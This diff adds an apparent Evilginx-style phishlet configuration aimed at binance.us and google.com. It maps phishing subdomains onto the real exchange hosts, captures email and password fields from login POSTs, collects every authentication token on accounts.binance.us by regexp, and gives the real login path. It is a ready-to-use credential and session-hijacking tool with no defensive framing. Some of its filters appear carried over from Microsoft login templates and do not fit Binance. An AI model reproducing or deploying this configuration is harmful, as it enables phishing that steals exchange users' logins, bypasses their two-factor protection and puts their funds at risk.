@@ -1,0 +1,47 @@
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'binance.us', session: true, is_landing: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'preprod', orig_sub: 'preprod', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'stream', orig_sub: 'stream', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'support', orig_sub: 'support', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'test', orig_sub: 'test', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'docs', orig_sub: 'docs', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'blog', orig_sub: 'blogs', domain: 'binance.us', session: false, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  
+
+sub_filters:
+  - {triggers_on: 'www.binance.us', orig_sub: 'www', domain: 'binance.us', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'preprod.binance.us', orig_sub: 'preprod', domain: 'binance.us', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'static.binance.us', orig_sub: 'static', domain: 'binance.us', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'stream.binance.us', orig_sub: 'stream', domain: 'binance.us', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api.binance.us', orig_sub: 'api', domain: 'binance.us', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'support.binance.us', orig_sub: 'support', domain: 'binance.us', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.binance.us', orig_sub: 'accounts', domain: 'binance.us', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'test.binance.us', orig_sub: 'test', domain: 'binance.us', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'docs.binance.us', orig_sub: 'docs', domain: 'binance.us', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'blog.binance.us', orig_sub: 'blog', domain: 'binance.us', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.binance.us', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+auth_tokens:
+  - domain: 'accounts.binance.us'
+    keys: [".*,regexp"]
+credentials:
+    username:
+     key: 'email'
+     search: '(.*)'
+     type: 'post'
+    password:
+     key: 'password'
+     search: '(.*)'
+     type: 'post'
+auth_urls:
+  - '/mail'
+  - '/mail/'
+login:
+  domain: 'accounts.binance.us'
+  path: '/en/login?return_to=aHR0cHM6Ly93d3cuYmluYW5jZS51cy9lbi9ob21l'
